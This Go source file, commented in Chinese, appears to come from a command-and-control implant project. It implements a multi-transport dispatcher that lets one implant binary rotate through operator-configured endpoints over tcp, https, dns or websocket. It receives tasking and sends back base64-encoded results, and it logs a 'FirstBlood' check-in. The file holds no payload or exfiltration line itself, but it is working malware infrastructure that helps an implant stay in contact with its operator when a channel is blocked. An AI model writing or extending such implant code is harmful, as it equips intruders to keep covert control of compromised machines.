//go:build transport_multi

package main

import (
	"errors"
	"fmt"
	"implant/core/debuglog"
	"implant/core/reconnect"
	"strings"
	"sync"
)

// 单二进制多传输（阶段三 · 第 15 项）。
//
// 装一个二进制、配一组端点（scheme://addr,...），运行时按 endpoint 的 scheme
// 选择传输实现；某个端点连不上时 runloop 会调用 app.AdvanceEndpoint() 轮转到
// 下一个端点——下一个端点可以是完全不同的传输（tcp → https → dns）。
//
// 为什么不在 Connect 内部再枚举一遍 scheme 回退：端点顺序就是操作员定义的回退顺序，
// 一个端点对应一种传输；runloop 的下一轮重连自然会试下一个端点。在 Connect 里
// 额外猜测"这个地址也许能用另一种协议"只会制造难以诊断的连接行为。

func init() {
	newMultiTransportFn = func() transportClient { return newMultiTransport() }
}

type multiTransport struct {
	mu           sync.Mutex
	active       transportClient
	activeScheme string
	reconnectMgr *reconnect.ReconnectManager
}

func newMultiTransport() *multiTransport {
	return &multiTransport{reconnectMgr: reconnect.NewReconnectManager()}
}

// splitEndpoint 拆分 scheme://address，并归一化 scheme 别名
func splitEndpoint(host string) (scheme, addr string, err error) {
	idx := strings.Index(host, "://")
	if idx <= 0 {
		return "", "", fmt.Errorf("多传输端点的格式必须是 scheme://address，收到 %q", host)
	}
	scheme = normalizeTransportScheme(host[:idx])
	addr = strings.TrimSpace(host[idx+3:])
	if addr == "" {
		return "", "", fmt.Errorf("端点 %q 缺少地址", host)
	}
	return scheme, addr, nil
}

// normalizeTransportScheme 归一化别名（服务端 listener 类型以 websocket 为准）
func normalizeTransportScheme(s string) string {
	switch strings.ToLower(strings.TrimSpace(s)) {
	case "ws", "websocket":
		return "websocket"
	default:
		return strings.ToLower(strings.TrimSpace(s))
	}
}

func (m *multiTransport) Connect(host string) error {
	scheme, addr, err := splitEndpoint(host)
	if err != nil {
		return err
	}
	ctor, ok := transportRegistry[scheme]
	if !ok {
		return fmt.Errorf("未知传输类型 %q（可用: %s）", scheme, strings.Join(registeredSchemes(), ","))
	}

	m.mu.Lock()
	prev := m.active
	m.active = nil
	m.mu.Unlock()
	if prev != nil {
		_ = prev.Close()
	}

	client := ctor()
	if err := client.Connect(addr); err != nil {
		return fmt.Errorf("[%s] 连接 %s 失败: %w", scheme, addr, err)
	}

	m.mu.Lock()
	m.active = client
	m.activeScheme = scheme
	m.mu.Unlock()

	// FirstBlood 里的类型与日志都用实际生效的传输
	listenerType = scheme
	debuglog.Printf("🔀 [MULTI] 当前传输: %s (%s)\n", scheme, addr)
	return nil
}

func (m *multiTransport) Recv() ([]byte, error) {
	c := m.current()
	if c == nil {
		return nil, errors.New("多传输调度器尚未连接")
	}
	return c.Recv()
}

func (m *multiTransport) SendResult(b64Packet []byte) error {
	c := m.current()
	if c == nil {
		return errors.New("多传输调度器尚未连接")
	}
	return c.SendResult(b64Packet)
}

func (m *multiTransport) Close() error {
	m.mu.Lock()
	c := m.active
	m.active = nil
	m.mu.Unlock()
	if c != nil {
		return c.Close()
	}
	return nil
}

func (m *multiTransport) IsConnected() bool {
	c := m.current()
	return c != nil && c.IsConnected()
}

func (m *multiTransport) ReconnectMgr() *reconnect.ReconnectManager { return m.reconnectMgr }

// Underlying 返回当前实际传输，供 runloop 判断轮询/持久型（见 runloop.go）
func (m *multiTransport) Underlying() transportClient { return m.current() }

// ActiveScheme 当前生效的传输类型（日志/诊断）
func (m *multiTransport) ActiveScheme() string {
	m.mu.Lock()
	defer m.mu.Unlock()
	return m.activeScheme
}

func (m *multiTransport) current() transportClient {
	m.mu.Lock()
	defer m.mu.Unlock()
	return m.active
}

// registeredSchemes 注册表里的传输类型（排序后用于错误提示）
func registeredSchemes() []string {
	out := make([]string, 0, len(transportRegistry))
	for k := range transportRegistry {
		out = append(out, k)
	}
	// 简单插入排序：类型数量固定且很少
	for i := 1; i < len(out); i++ {
		for j := i; j > 0 && out[j] < out[j-1]; j-- {
			out[j], out[j-1] = out[j-1], out[j]
		}
	}
	return out
}
